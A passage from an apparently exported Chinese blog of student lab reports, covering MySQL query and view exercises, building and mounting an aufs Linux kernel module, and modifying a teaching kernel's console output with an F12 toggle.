 <div class="note info"><p>在 MySQL 中，<code>VALUES</code> 子句可以一次插入多组值。</p>
</div>
</li>
<li>
<p>将所有硬盘容量为 120GB 的笔记本的价格下调 200 元。</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> laptop</span><br><span class="line"><span class="keyword">SET</span> price<span class="operator">=</span>price<span class="number">-200</span></span><br><span class="line"><span class="keyword">WHERE</span> hd<span class="operator">=</span><span class="number">120</span>;</span><br></pre></td></tr></tbody></table></figure>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/update_data_1.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/update_data_2.png" class=""></div></div></div>
</li>
<li>
<p>型号为 2004 的电脑已经停产，请删除其相关记录。</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span></span><br><span class="line"><span class="keyword">FROM</span> laptop</span><br><span class="line"><span class="keyword">WHERE</span> model<span class="operator">=</span><span class="number">2004</span>;</span><br></pre></td></tr></tbody></table></figure>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/delete_data_1.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/delete_data_2.png" class=""></div></div></div>
</li>
</ol>
<h4 id="数据查询">数据查询</h4>
<ol>
<li>
<p>（单表查询）查询制造商 A 的所有产品，按照产品序列号降序排列。</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> product</span><br><span class="line"><span class="keyword">where</span> maker<span class="operator">=</span><span class="string">'A'</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> model <span class="keyword">DESC</span>;</span><br></pre></td></tr></tbody></table></figure>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/select_1.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/select_1_result.png" class=""></div></div></div>
</li>
<li>
<p>（连接查询 I）查询生产了速度为 2.80 的 PC 机制造商。</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> maker <span class="keyword">FROM</span> product, pc</span><br><span class="line"><span class="keyword">WHERE</span> product.model<span class="operator">=</span>pc.model</span><br><span class="line"><span class="keyword">AND</span> speed<span class="operator">=</span><span class="number">2.8</span>;</span><br></pre></td></tr></tbody></table></figure>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/select_2.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/select_2_result.png" class=""></div></div></div>
 <div class="note warning"><p>由于浮点数比较问题，这里的 speed 若是 float 或 double 类型，则会查找失败！<br>
解决方案：将 speed 设为 decimal (dec) 类型。</p>
</div>
</li>
<li>
<p>（连接查询 II）计算制造商 C 生产的所有笔记本的总价格。</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUM</span>(price)</span><br><span class="line"><span class="keyword">FROM</span> product, laptop</span><br><span class="line"><span class="keyword">WHERE</span> maker <span class="keyword">IN</span>(<span class="string">'C'</span>)</span><br><span class="line"><span class="keyword">AND</span> product.model<span class="operator">=</span>laptop.model;</span><br></pre></td></tr></tbody></table></figure>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/select_3.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/select_3_result.png" class=""></div></div></div>
</li>
<li>
<p>（嵌套查询 I）查询生产了型号为 2007 号笔记本的厂商都生产了哪些产品和型号。</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> model, type</span><br><span class="line"><span class="keyword">FROM</span> product</span><br><span class="line"><span class="keyword">WHERE</span> maker <span class="keyword">IN</span> (<span class="keyword">SELECT</span> maker</span><br><span class="line">        <span class="keyword">FROM</span> product, pc, laptop</span><br><span class="line">        <span class="keyword">WHERE</span> (product.model<span class="operator">=</span>pc.model <span class="keyword">OR</span> product.model<span class="operator">=</span>laptop.model)</span><br><span class="line">        <span class="keyword">AND</span> product.model<span class="operator">=</span><span class="number">2007</span>);</span><br></pre></td></tr></tbody></table></figure>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/select_4.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/select_4_result.png" class=""></div></div></div>
</li>
<li>
<p>（嵌套查询 II）查询硬盘容量比所有 PC 机都小的笔记本电脑的型号及其硬盘容量大小。</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> model, hd</span><br><span class="line"><span class="keyword">FROM</span> laptop</span><br><span class="line"><span class="keyword">WHERE</span> hd<span class="operator">&lt;</span><span class="keyword">ALL</span>(<span class="keyword">SELECT</span> hd <span class="keyword">FROM</span> pc);</span><br></pre></td></tr></tbody></table></figure>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/select_5.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/select_5_result.png" class=""></div></div></div>
</li>
<li>
<p>（集合查询）查询所有硬盘容量为 500G 的电脑型号及其类型。</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> product.model,type</span><br><span class="line"><span class="keyword">FROM</span> laptop, product</span><br><span class="line"><span class="keyword">WHERE</span> product,model<span class="operator">=</span>laptop.model <span class="keyword">AND</span> hd<span class="operator">=</span><span class="number">500</span></span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> product.model, type</span><br><span class="line"><span class="keyword">FROM</span> pc, product</span><br><span class="line"><span class="keyword">WHERE</span> product.model<span class="operator">=</span>pc.model <span class="keyword">AND</span> hd<span class="operator">=</span><span class="number">500</span>;</span><br></pre></td></tr></tbody></table></figure>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/select_6.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/select_6_result.png" class=""></div></div></div>
</li>
</ol>
<h3 id="视图操作">视图操作</h3>
<div class="note info"><p>在 MySQL 中，视图是一种虚拟表，它的数据并不存储在数据库中，而是通过查询语句动态生成。</p>
</div>
<ol>
<li>
<p>（视图创建）建立笔记本电脑所有信息的视图。</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> laptop_info <span class="keyword">AS</span></span><br><span class="line">	<span class="keyword">SELECT</span> maker, speed, ram, hd, price</span><br><span class="line">	<span class="keyword">FROM</span> product, laptop</span><br><span class="line">	<span class="keyword">WHERE</span> </span><br><span class="line">		type <span class="keyword">IN</span> (<span class="string">'laptop'</span>) </span><br><span class="line">		<span class="keyword">AND</span> product.model<span class="operator">=</span>laptop.model;</span><br></pre></td></tr></tbody></table></figure>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/create_view_1.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/create_view_2.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/create_view_3.png" class=""></div></div></div>
</li>
<li>
<p>（视图更新）将制造商 C 的所有笔记本价格上调 200 元。</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> SQL_SAFE_UPDATES<span class="operator">=</span><span class="number">0</span>;</span><br><span class="line"><span class="keyword">UPDATE</span> laptop_info</span><br><span class="line"><span class="keyword">SET</span> price<span class="operator">=</span>price<span class="operator">+</span><span class="number">200</span></span><br><span class="line"><span class="keyword">WHERE</span> maker<span class="operator">=</span><span class="string">'C'</span>;</span><br></pre></td></tr></tbody></table></figure>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/update_view_1.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/update_view_2.png" class=""></div></div></div>
</li>
<li>
<p>（视图查询）在笔记本中找出屏幕大小为 17 寸的所有产品信息。</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> laptop_info</span><br><span class="line"><span class="keyword">WHERE</span> screen<span class="operator">=</span><span class="number">17</span>;</span><br></pre></td></tr></tbody></table></figure>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/select_view_1.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/select_view_2.png" class=""></div></div></div>
 <div class="note warning"><p>若 screen 的数据类型为 double 或 float，类似于数据查询，也会导致查询失败！</p>
</div>
</li>
<li>
<p>（视图删除）删除笔记本电脑信息视图。</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">VIEW</span> laptop_info;</span><br></pre></td></tr></tbody></table></figure>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/drop_view_1.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/drop_view_2.png" class=""></div></div></div>
</li>
</ol>
<h2 id="遇到的问题和解决方案">遇到的问题和解决方案</h2>
<ol>
<li>
<p>使用 update 命令更新数据时出现 1175 错误。提示信息如下：</p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Error Code: 1175. You are using safe update mode and you tried to update a table without a WHERE that uses a KEY column To disable safe mode, toggle the option in Preferences -&gt; SQL Editor and reconnect.</span><br></pre></td></tr></tbody></table></figure>
<p>MySQL 有个叫 <code>SQL_SAFE_UPDATES</code> 的变量，为了数据库更新操作的安全性，此值默认为 <code>1</code>，所以才会出现更新失败的情况。所以，出现 1175 错误的时候，可以先设置 <code>SQL_SAFE_UPDATES</code> 的值为 <code>0</code>，然后再执行更新。对于上例来说，直接在前面加上一句 <code>SET SQL_SAFE_UPDATES = 0; </code>即可解决问题。</p>
</li>
<li>
<p>在 MySQL 中，<code>CREATE DATABASE</code> 和 <code>CREATE SCHEMA</code> 的区别是什么？</p>
 <blockquote><p>“CREATE DATABASE creates a database with the given name. To use this statement, you need the CREATE privilege for the database. CREATE SCHEMA is a synonym for CREATE DATABASE.”</p>
<footer><strong>MySQL 官方英文文档 </strong><cite><a href="https://dev.mysql.com/doc/refman/5.6/en/create-database.html">dev.mysql.com/doc/refman/5.6/en/create-database.html</a></cite></footer></blockquote>
<p><code>CREATE DATABASE</code> 根据给定的名称创建数据库，你需要拥有数据库的 <code>CREATE</code> 权限来使用这个语句。<code>CREATE SCHEMA</code> 是 <code>CREATE DATABASE</code> 的一个代名词。由此可见，在 MySQL 的语法操作中（MySQL5.0.2 之后），可以使用 <code>CREATE DATABASE</code> 和 <code>CREATE SCHEMA</code> 来创建数据库，两者在功能上是一致的。在使用 MySQL 官方的 MySQL 管理工具 MySQL Workbench 5.2.47 创建数据库时，使用的是 <code>CREATE SCHEMA</code> 来创建数据库的。而这和 MS SQL 中的 <code>SCHEMA</code> 有很大差别。</p>
</li>
<li>
<p>在 MySQL 修改基本表中列的数据类型时，使用的命令是 <code>CHANGE COLUMN</code>。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>实验</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>文件系统实验</title>
    <url>/2019/11/11/experiments/oskernel/file-system/</url>
    <content><![CDATA[<h2 id="实验目的">实验目的</h2>
<ol>
<li>掌握文件系统的工作机理，通过一个简单内核源码理解文件系统的主要数据结构。</li>
<li>学习较为复杂的 Linux 系统下的编程</li>
<li>了解 EXT2 文件系统的结构</li>
</ol>
<span id="more"></span>
<h2 id="步骤">步骤</h2>
<div class="note info no-icon"><p>以下操作都是在 root 用户下进行的，所以不用加 <code>sudo</code></p>
</div>
<ol>
<li>
<p>解压 <code>filesystem2.tar.gz</code> 文件，得到源文件如下图所示 <img data-src="/2019/11/11/experiments/oskernel/file-system/1.png" class=""></p>
</li>
<li>
<p>直接运行 <code>make</code>，发现报错 <img data-src="/2019/11/11/experiments/oskernel/file-system/2.png" class=""></p>
</li>
<li>
<p>开始解决问题，先在系统中寻找 <code>3.10.0-327.el7.x86_64/build</code> 的链接。 <img data-src="/2019/11/11/experiments/oskernel/file-system/3.png" class=""></p>
</li>
<li>
<p>它指向 <code>/usr/src/kernels/3.10.0-327.el7.x86_64</code>，再去这个路径里面看看。</p>
 <img data-src="/2019/11/11/experiments/oskernel/file-system/4.png" class="">
</li>
<li>
<p>这里什么都没有。说明我的红帽系统缺少相应的内核开发包。</p>
 <img data-src="/2019/11/11/experiments/oskernel/file-system/5.png" class="">
</li>
<li>
<p>上网搜索相应的 kernel-devel 包，下载，并传送到虚拟机上。</p>
</li>
<li>
<p>使用 <code>rpm2cpio</code> 安装该包。 <img data-src="/2019/11/11/experiments/oskernel/file-system/6.png" class=""></p>
</li>
<li>
<p>再尝试 <code>make</code>，这次成功。 <img data-src="/2019/11/11/experiments/oskernel/file-system/7.png" class=""></p>
</li>
<li>
<p>使用 <code>insmod aufs.ko</code> 加载内核模块，发现无法安装。再 <code>dmesg | tail</code> 查看内核 debug 信息。 <img data-src="/2019/11/11/experiments/oskernel/file-system/8.png" class=""></p>
</li>
<li>
<p>方知内核版本不支持，需要重新使用正确的内核版本编译才能通过。内核所需的 <code>rhelversion</code> 为 7.5，而我的系统为 7.2，显然不匹配。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/11/experiments/oskernel/file-system/9.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/11/experiments/oskernel/file-system/10.png" class=""></div></div></div>
</li>
<li>
<p>我选择使用一台新的虚拟机来完成本实验。当然，系统安装结束后，要装载安装光盘镜像，从 <code>Packages</code> 目录中安装内核相关包，<code>gcc</code> 和 <code>g++</code> 也要顺手安装。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/11/experiments/oskernel/file-system/11.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/11/experiments/oskernel/file-system/12.png" class=""></div></div></div>
</li>
<li>
<p>再次 <code>make</code>。警告不影响编译通过。 <img data-src="/2019/11/11/experiments/oskernel/file-system/13.png" class=""></p>
</li>
<li>
<p>再次尝试加载模块，这次就没有错误出现了。<img data-src="/2019/11/11/experiments/oskernel/file-system/14.png" class=""></p>
<div class="note info"><p>内核信息也可以看到加载内核的日志消息。<code>super.c</code> 中 <code>static int __init aufs_init(void)</code> 得以执行<br>
<img data-src="/2019/11/11/experiments/oskernel/file-system/15.png" class=""></p>
</div> 
<div class="note warning"><p>解决 module verification failed 的方法是上网搜的，source:(<a href="https://blog.csdn.net/lyw13522476337/article/details/79486326">https://blog.csdn.net/lyw13522476337/article/details/79486326</a>)；但是在加载 <code>mkfs.aufs</code> 后不需解决这个问题</p>
</div>
</li>
<li>
<p>直接使用 <code>mount -o loop -t aufs ./image ./dir</code> 挂载该模块，系统会重启。但是在重启后并没有找到刚才挂载上的目录。查阅资料后发现 <code>mount</code> 挂载是临时的，需要修改 <code>/etc/fstab</code> 文件，开机的时候，系统就是根据这个分区来挂载系统的。</p>
<div class="note info"><p>我没有选择修改 <code>/etc/fstab</code> 文件，因为这个操作<mark class="label danger">容易使系统崩溃</mark></p>
</div>
</li>
<li>
<p>格式化分区（关键的一步）</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">./mkfs.aufs ./image</span><br></pre></td></tr></tbody></table></figure>
<img data-src="/2019/11/11/experiments/oskernel/file-system/16.png" class="">
<p>然后再 <code>mount</code>，再次挂载系统就不会重启了。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">insmod aufs.ko</span><br><span class="line">mount -o loop -t aufs ./image ./dir</span><br></pre></td></tr></tbody></table></figure>
<img data-src="/2019/11/11/experiments/oskernel/file-system/17.png" class="">
<div class="note info no-icon"><p>此时 <code>dmesg</code> 的输出如下</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[ 2082.575699] loop: module loaded</span><br><span class="line">[ 2093.191691] create inode cache success</span><br><span class="line">[ 2093.191698] register filesystem success</span><br><span class="line">[ 2093.191700] aufs module loaded</span><br><span class="line">[ 2094.725812] Buffer I/O error on dev loop0, logical block 0, async page read</span><br><span class="line">[ 2094.725832] Buffer I/O error on dev loop0, logical block 0, async page read</span><br><span class="line">[ 2094.725839] Buffer I/O error on dev loop0, logical block 0, async page read</span><br><span class="line">[ 2094.725846] Buffer I/O error on dev loop0, logical block 0, async page read</span><br><span class="line">[ 2094.725852] Buffer I/O error on dev loop0, logical block 0, async page read</span><br><span class="line">[ 2094.725859] Buffer I/O error on dev loop0, logical block 0, async page read</span><br><span class="line">[ 2094.725874] Buffer I/O error on dev loop0, logical block 3, async page read</span><br><span class="line">[ 2094.756612] aufs_super_block_fill 320017171</span><br><span class="line">[ 2094.756615] now magic number 320017171</span><br><span class="line">[ 2094.756617] aufs super block info:</span><br><span class="line">	magic           = 320017171</span><br><span class="line">	inode blocks    = 1</span><br><span class="line">	block size      = 4096</span><br><span class="line">	root inode      = 1</span><br><span class="line">	inodes in block = 128</span><br><span class="line">[ 2094.756621] now device block size 4096</span><br><span class="line">[ 2094.756633] aufs reads inode 1 from 3 block with offset 32</span><br><span class="line">[ 2094.756642] aufs inode 1 info:</span><br><span class="line">	size   = 0</span><br><span class="line">	block  = 4</span><br><span class="line">	blocks = 1</span><br><span class="line">	uid    = 0</span><br><span class="line">	gid    = 0</span><br><span class="line">	mode   = 40755</span><br><span class="line">[ 2094.756778] aufs_inode_get success</span><br><span class="line">[ 2094.756782] d_make_root success</span><br><span class="line">[ 2094.756783] aufs mounted</span><br></pre></td></tr></tbody></table></figure>
<p>从 debug 输出看，aufs 文件系统注册时（insmod 操作时），经历了加载 inode，注册文件系统两个过程。在 mount 的过程中获得了 inode 信息，建立了文件系统根目录，其中为 super block 超级块分配了一个魔法数，super block 大小为 4096，它含有 128 块 inode。第一块 inode 的大小为 0，有 4 块 block。Device 的块大小为 4096，偏移值为 32，从第一块 inode 的 block3 开始读的。Mode 的含义是，这是一个目录（0x40000），所有者拥有全部权限（0x700），用户组可读取，可写入（0x40|0x10），其他用户可读取，可写入（0x40|0x10）。</p>
</div>
<p>可以用 <code>lsmod</code> 命令查看加载的模块列表，刚才的 <code>aufs</code> 在其中。</p>
<img data-src="/2019/11/11/experiments/oskernel/file-system/19.png" class="">
</li>
<li>
<p>刚刚挂载上去的文件系统在桌面上是这样显示的 <img data-src="/2019/11/11/experiments/oskernel/file-system/20.png" class=""></p>
</li>
<li>
<p>卸载模块：<code>rmmod xxx.ko</code></p>
<img data-src="/2019/11/11/experiments/oskernel/file-system/18.png" class="">
<p><code>Super.c</code> 中 <code>static void __exit aufs_fini(void)</code> 得以执行</p>
</li>
</ol>
<h2 id="实验关键里程碑数据与结果">实验关键里程碑数据与结果</h2>
<h3 id="内核源代码结构分析">内核源代码结构分析</h3>
<div class="tabs" id="core"><ul class="nav-tabs"><li class="tab active"><a href="#core-1"><code>aufs.h</code></a></li><li class="tab"><a href="#core-2"><code>aufs.mod.c</code></a></li><li class="tab"><a href="#core-3"><code>dir.c</code></a></li><li class="tab"><a href="#core-4"><code>file.c</code></a></li><li class="tab"><a href="#core-5"><code>inode.c</code></a></li><li class="tab"><a href="#core-6"><code>super.c</code></a></li></ul><div class="tab-content"><div class="tab-pane active" id="core-1"><p>文件系统各种结构的定义，比如 block、inode、entry</p>
<figure class="highlight c"><figcaption><span>aufs.h</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">aufs_disk_super_block</span> {</span>    <span class="comment">//磁盘超级块结构定义</span></span><br><span class="line">	__be32	dsb_magic;    <span class="comment">//魔法数？</span></span><br><span class="line">	__be32	dsb_block_size;    <span class="comment">//每一块的大小</span></span><br><span class="line">	__be32	dsb_root_inode;    <span class="comment">//每一个inode的根节点</span></span><br><span class="line">	__be32	dsb_inode_blocks;  <span class="comment">//每一个超级块有多少块inode节点</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">aufs_disk_inode</span> {</span>    <span class="comment">//inode结构定义</span></span><br><span class="line">	__be32	di_first;     <span class="comment">//首节点</span></span><br><span class="line">	__be32	di_blocks;   <span class="comment">//节点块数</span></span><br><span class="line">	__be32	di_size;     <span class="comment">//节点大小</span></span><br><span class="line">	__be32	di_gid;      <span class="comment">//节点组号</span></span><br><span class="line">	__be32	di_uid;     <span class="comment">//节点唯一编号</span></span><br><span class="line">	__be32	di_mode;   <span class="comment">//节点模式和访问权限</span></span><br><span class="line">	__be64	di_ctime;   <span class="comment">//节点创建时间</span></span><br><span class="line">};</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">aufs_disk_dir_entry</span> {</span>  <span class="comment">//磁盘目录对应表定义</span></span><br><span class="line">	<span class="type">char</span> dde_name[AUFS_DDE_MAX_NAME_LEN];  <span class="comment">//磁盘名字</span></span><br><span class="line">	__be32 dde_inode;  <span class="comment">//对应了哪个节点</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">aufs_super_block</span> {</span>   <span class="comment">//aufs超级块定义</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> asb_magic;   <span class="comment">//魔法数？</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> asb_inode_blocks;   <span class="comment">//已使用（？）inode数量</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> asb_block_size;     <span class="comment">//块的大小</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> asb_root_inode;     <span class="comment">//根inode</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> asb_inodes_in_block; <span class="comment">//总共多少块inode</span></span><br><span class="line">};</span><br><span class="line">......</span><br></pre></td></tr></tbody></table></figure>
<p>还定义了 <code>inode</code> 的获取、分配和删除操作。</p></div><div class="tab-pane" id="core-2"><p>aufs 模块定义，内核版本定义等</p>
<figure class="highlight c"><figcaption><span>aufs.mod.c</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">MODULE_INFO(srcversion, <span class="string">"7E6AB09FC99FF944E10E236"</span>);</span><br><span class="line">MODULE_INFO(rhelversion, <span class="string">"7.5"</span>);</span><br></pre></td></tr></tbody></table></figure></div><div class="tab-pane" id="core-3"><p>文件系统目录操作定义和实现，目录管理功能</p></div><div class="tab-pane" id="core-4"><p>定义设备操作 <code>device_open</code>、<code>device_release</code>、<code>device_read</code>、<code>device_write</code> 及其实现</p></div><div class="tab-pane" id="core-5"><p>文件结点操作</p></div><div class="tab-pane" id="core-6"><p>模块的装载与卸载</p></div></div></div>
<h2 id="实验难点与收获">实验难点与收获</h2>
<p>内核的安装比普通软件的安装要更加困难，它需要系统内核版本的匹配和更多的命令。这个实验给了一个 7.5 的红帽版本的 ko 内核，一开始并没有意识到版本问题，编译、挂载总是失败。后来解决了版本问题，但是挂载后系统会自动重启，而 Linux 重启后所有的挂载均会消失，很坑。</p>
<p>一步关键的动作是使用 mkfs.aufs 来格式化所给定的 image 文件。</p>
<p>观看内核源代码，发现它十分复杂，很难一次读通，对我来说是个极大的挑战。</p>
<h2 id="实验思考">实验思考</h2>
<p>能不能照着这个给定的模块结构，自己写一个 Linux 内核模块呢？</p>
]]></content>
      <categories>
        <category>实验</category>
        <category>技术</category>
        <category>OS</category>
        <category>操作系统内核</category>
        <category>Linux</category>
        <category>文件系统</category>
      </categories>
      <tags>
        <tag>OS</tag>
        <tag>Linux</tag>
        <tag>文件系统</tag>
      </tags>
  </entry>
  <entry>
    <title>设备管理实验</title>
    <url>/2019/12/04/experiments/oskernel/iodevice/</url>
    <content><![CDATA[<h2 id="实验目的">实验目的</h2>
<p>尝试加载运行给定的内核程序，以理解内核的结构。尝试修改设备管理相关代码以实现一些简单的功能。</p>
<span id="more"></span>
<h2 id="步骤">步骤</h2>
<h3 id="实验准备">实验准备</h3>
<ol>
<li>
<p>首先解压给定的压缩包。</p>
 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">tar -zxvf iodevicemanagement.tar.gz</span><br></pre></td></tr></tbody></table></figure>
 <img data-src="/2019/12/04/experiments/oskernel/iodevice/1.png" class="">
</li>
<li>
<p>安装 <code>build-essential</code>，发现失败。在</p>
 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">sudo <span class="built_in">rm</span> /var/lib/apt/lists/* -vf</span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></tbody></table></figure>
<p>后可以解决。接下来安装 <code>qemu</code>，过程类似，没有截图。 <img data-src="/2019/12/04/experiments/oskernel/iodevice/2.png" class=""></p>
</li>
<li>
<p>先对 build.sh 加执行权限。</p>
 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x tools/build.sh</span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>然后运行 <code>make</code></p>
<img data-src="/2019/12/04/experiments/oskernel/iodevice/5.png" class="">
</li>
<li>
<p>Make 生成结束后，使用 <code>make start</code> 启动虚拟机。 <img data-src="/2019/12/04/experiments/oskernel/iodevice/6.png" class=""></p>
</li>
<li>
<p>出来一个叫做 QEMU 的黑色窗口，到这里，实验环境算是准备好了。 <img data-src="/2019/12/04/experiments/oskernel/iodevice/7.png" class=""></p>
</li>
</ol>
<h3 id="尝试修改内核代码">尝试修改内核代码</h3>
<div class="note info"><h4 id="需求">需求</h4>
<p>修改内核中 I/O 设备代码，实现按<kbd> F12</kbd>，<code>ls</code> 命令显示的信息替换成 <code>*</code>，再按<kbd> F12</kbd> 恢复正常，如此反复。</p>
</div>
<p>原来，虚拟机系统按<kbd> F12</kbd> 时，显示如下信息：</p>
<img data-src="/2019/12/04/experiments/oskernel/iodevice/8-f12.png" class="">
<p>根据这个输出，我们找到了相应的源代码。</p>
<figure class="highlight c"><figcaption><span>/kernel/sched.c</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">show_task</span><span class="params">(<span class="type">int</span> nr,<span class="keyword">struct</span> task_struct * p)</span></span><br><span class="line">{ </span><br><span class="line">	<span class="type">int</span> i,j = <span class="number">4096</span>-<span class="keyword">sizeof</span>(<span class="keyword">struct</span> task_struct);</span><br><span class="line"></span><br><span class="line marked">	printk(<span class="string">"%d: pid=%d, state=%d, "</span>,nr,p-&gt;pid,p-&gt;state);</span><br><span class="line">	i=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (i&lt;j &amp;&amp; !((<span class="type">char</span> *)(p+<span class="number">1</span>))[i])</span><br><span class="line">		i++;</span><br><span class="line marked">	printk(<span class="string">"%d (of %d) chars free in kernel stack\n\r"</span>,i,j);</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<div class="note info"><h4 id="code-printk-code-是啥？"><code>printk</code> 是啥？</h4>
<p><code>printk</code> 是在内核中运行的向控制台输出显示的函数，Linux 内核首先在内核空间分配一个静态缓冲区，作为显示用的空间，然后调用 <code>sprintf</code>，格式化显示字符串，最后调用 <code>tty_write</code> 向终端进行信息的显示。</p>
</div>
<div class="tabs" id="change"><ul class="nav-tabs"><li class="tab active"><a href="#change-1"><code>/include/linux/sched.h</code></a></li><li class="tab"><a href="#change-2"><code>/kernel/sched.c</code></a></li><li class="tab"><a href="#change-3"><code>/kernel/chr_drv/console.c</code></a></li><li class="tab"><a href="#change-4"><code>/kernel/chr_drv/keyboard.S</code></a></li></ul><div class="tab-content"><div class="tab-pane active" id="change-1"><p>声明变量 <code>int f12_state</code></p>
<figure class="highlight c"><figcaption><span>/include/linux/sched.h</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> f12_state; <span class="comment">//if it is 1,all chars are replaced with *</span></span><br></pre></td></tr></tbody></table></figure></div><div class="tab-pane" id="change-2"><p>实现<kbd> f12</kbd> 开关功能</p>
<figure class="highlight c"><figcaption><span>/kernel/sched.c</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">f12_state = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">switch_f12</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (f12_state == <span class="number">1</span>)</span><br><span class="line">        f12_state = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        f12_state = <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><div class="tab-pane" id="change-3"><p>修改 <code>con_write</code> 函数，即改变显示的字符。</p>
